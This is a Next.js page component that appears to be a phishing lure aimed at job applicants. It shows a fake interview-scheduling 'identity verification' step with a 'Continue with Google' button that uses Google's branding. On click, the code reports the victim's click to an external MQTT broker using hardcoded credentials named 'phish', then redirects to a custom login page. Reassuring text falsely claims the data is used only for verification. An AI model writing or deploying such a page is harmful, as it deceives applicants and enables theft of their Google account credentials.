'use client';
import mqtt from 'mqtt';
import { useRouter } from 'next/navigation'; // Import for navigation
import { ShieldCheck, Info } from 'lucide-react';

export default function SchedulePage() {
  const router = useRouter(); // Initialize the router

  const handleGoogleLogin = () => {
    const host = 'ya17a2d0.ala.asia-southeast1.emqxsl.com'; 
    const username = 'phish';           
    const password = 'Phish';           

    // 1. Fresh connection for this click
    const client = mqtt.connect(`wss://${host}:8084/mqtt`, {
      username: username,
      password: password,
      clientId: 'web_client_' + Math.random().toString(16).substring(2, 8),
      connectTimeout: 4000,
      reconnectPeriod: 0, 
    });

    client.on('connect', () => {
      console.log('Successfully connected to private broker!');

      const payload = JSON.stringify({
        event: 'GOOGLE_LOGIN_CLICKED',
        applicant: 'Photographer_Candidate',
        time: new Date().toLocaleString()
      });

      // 2. Publish with QoS 1 to ensure delivery before moving pages
      client.publish('172', payload, { qos: 1 }, (err) => {
        if (!err) {
          console.log('Ping message delivered to EMQX!');
        }
        
        // 3. Close connection and navigate
        client.end(true); 
        router.push('/login'); // Redirects to your custom login page
      });
    });

    client.on('error', (err) => {
      console.error('MQTT Connection Error:', err);
      client.end();
    });
  };

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-6 text-black">
      <div className="max-w-md w-full bg-white rounded-3xl shadow-xl p-8 border border-gray-100">
        
        <div className="flex items-start gap-4 p-4 bg-blue-50 rounded-2xl mb-8">
          <ShieldCheck className="w-8 h-8 text-blue-600 mt-1 flex-shrink-0" />
          <div>
            <h3 className="font-bold text-blue-900">Security Requirement</h3>
            <p className="text-sm text-blue-700 leading-relaxed">
              To prevent automated bookings and verify applicant identity, we require a verified Google account to proceed with the scheduling process.
            </p>
          </div>
        </div>

        <div className="text-center mb-8">
          <h2 className="text-2xl font-black text-gray-900 mb-2">Verify Your Identity</h2>
          <p className="text-gray-500 font-medium">Sign in to access available interview slots</p>
        </div>

        <button 
          onClick={handleGoogleLogin}
          className="w-full flex items-center justify-center gap-3 bg-white border border-gray-300 py-4 px-6 rounded-xl hover:bg-gray-50 hover:border-gray-400 transition-all shadow-sm group"
        >
          <img 
            src="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png" 
            alt="Google Logo" 
            className="w-6 h-6"
          />
          <span className="text-gray-700 font-semibold text-lg">Continue with Google</span>
        </button>

        <div className="mt-8 flex items-center gap-2 justify-center text-xs text-gray-400">
          <Info className="w-3 h-3" />
          <p>Your data is encrypted and used only for interview verification.</p>
        </div>
      </div>
    </div>
  );
}